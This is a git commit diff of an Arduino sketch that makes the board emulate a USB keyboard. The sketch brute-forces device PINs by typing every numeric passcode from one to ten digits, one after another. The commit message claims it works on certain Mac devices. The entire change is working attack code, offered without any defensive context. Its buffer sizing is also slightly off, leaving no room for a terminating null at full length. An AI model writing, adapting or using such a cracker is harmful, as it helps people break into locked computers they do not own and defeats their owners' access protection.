955b89ece919a1cd9d831742242b1ed719c65c18
Johnny O'Donnell <odjohnny@amazon.com>
2024-07-08 11:29:51 -0700

    Cracker currently works on certain Mac devices

--- pincode-cracker.ino
+++ pincode-cracker.ino
@@ -6,19 +6,45 @@
 // https://docs.arduino.cc/built-in-examples/usb/KeyboardAndMouseControl/
 // https://docs.arduino.cc/built-in-examples/basics/Blink/
 
+
 void setup() {
   // put your setup code here, to run once:
   Keyboard.begin();
   Mouse.begin();
   pinMode(LED_BUILTIN, OUTPUT);
+
+  // signal that loop is about to start
+  digitalWrite(LED_BUILTIN, HIGH);
+  delay(1000);
+  digitalWrite(LED_BUILTIN, LOW);
+  delay(1000);
+  digitalWrite(LED_BUILTIN, HIGH);
+  delay(1000);
+  digitalWrite(LED_BUILTIN, LOW);
+  delay(1000);
+}
+
+void attempt_passcode(char* passcode) {
+  Keyboard.println(passcode);
+  // Mouse.click();
+}
+
+void attempt_passcodes(char* passcode, int index, int length) {
+  if (index >= length) {
+    attempt_passcode(passcode);
+  } else {
+    for (int i = 0; i < 10; ++i) {
+      passcode[index] = '0' + i;
+      attempt_passcodes(passcode, index + 1, length);
+    }
+  }
 }
 
 void loop() {
-  // put your main code here, to run repeatedly:
-  Keyboard.print("This is a test...");
-  Mouse.click(MOUSE_LEFT);
-  digitalWrite(LED_BUILTIN, HIGH);  // turn the LED on (HIGH is the voltage level)
-  delay(1000);                      // wait for a second
-  digitalWrite(LED_BUILTIN, LOW);   // turn the LED off by making the voltage LOW
-  delay(1000);
+  int max_length = 10;
+  char passcode[max_length] = "";
+
+  for (int i = 0; i < max_length; ++i) {
+    attempt_passcodes(passcode, 0, i + 1);
+  }
 }
